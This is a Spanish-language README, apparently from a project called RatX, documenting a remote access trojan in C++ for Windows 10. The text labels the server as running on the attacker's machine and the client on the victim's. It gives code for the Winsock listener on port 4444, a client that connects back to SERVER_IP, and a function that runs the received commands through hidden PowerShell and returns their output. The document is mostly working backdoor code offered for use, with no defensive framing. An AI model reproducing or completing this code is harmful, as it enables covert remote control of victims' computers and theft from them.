# RatX - Servidor y Cliente RAT en C++ (Windows 10)

## Configuración y Funciones Esenciales

### Configuración del RAT
1. **Servidor**:
   - Debe ejecutarse en la máquina atacante.
   - Escucha en el puerto `4444` por conexiones entrantes del cliente.
   - Se asegura de que Winsock esté inicializado antes de crear el socket.
   
2. **Cliente**:
   - Se ejecuta en la máquina víctima.
   - Se conecta al servidor en la dirección IP definida (`SERVER_IP`).
   - Ejecuta comandos recibidos y envía la salida al servidor.

### Funciones Claves

#### **1. Inicialización de Winsock**
```cpp
void initWinsock() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "Error al inicializar Winsock" << std::endl;
        exit(1);
    }
}
```
- Configura la librería Winsock para el manejo de sockets en Windows.
- Si la inicialización falla, muestra un error y finaliza la ejecución.

#### **2. Crear y enlazar socket del servidor**
```cpp
serverSocket = socket(AF_INET, SOCK_STREAM, 0);
server.sin_family = AF_INET;
server.sin_addr.s_addr = INADDR_ANY;
server.sin_port = htons(PORT);

bind(serverSocket, (struct sockaddr*)&server, sizeof(server));
listen(serverSocket, 3);
```
- Crea un socket TCP.
- Lo enlaza a cualquier dirección IP disponible en el puerto `4444`.
- Lo pone en modo de escucha para aceptar conexiones.

#### **3. Aceptar conexiones en el servidor**
```cpp
clientSocket = accept(serverSocket, (struct sockaddr*)&client, &clientSize);
```
- Espera hasta que un cliente se conecte.
- Retorna un nuevo socket para manejar la comunicación con ese cliente.

#### **4. Recibir y ejecutar comandos en el cliente**
```cpp
std::string executeCommand(const std::string& command) {
    std::string fullCommand = "powershell -Command \"" + command + "\"";
    char buffer[BUFFER_SIZE];
    std::string result;
    FILE* pipe = _popen(fullCommand.c_str(), "r");
    if (!pipe) return "Error al ejecutar el comando";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}
```
- Ejecuta el comando recibido usando `PowerShell`.
- Captura la salida y la devuelve como string.
- Se usa `_popen()` para ejecutar comandos y leer la salida.

#### **5. Enviar respuesta al servidor**
```cpp
std::string output = executeCommand(command);
output += "\n[END]";
send(clientSocket, output.c_str(), output.length(), 0);
```
- La respuesta del comando se envía de vuelta al servidor.
- Se agrega `"[END]"` como delimitador para indicar el fin de la respuesta.

### **Resumen**
- El servidor escucha en `4444`, acepta conexiones y envía comandos.
- El cliente se conecta, recibe comandos, los ejecuta y devuelve la respuesta.
- Se usa `PowerShell` para ejecutar los comandos de manera oculta en la máquina víctima.
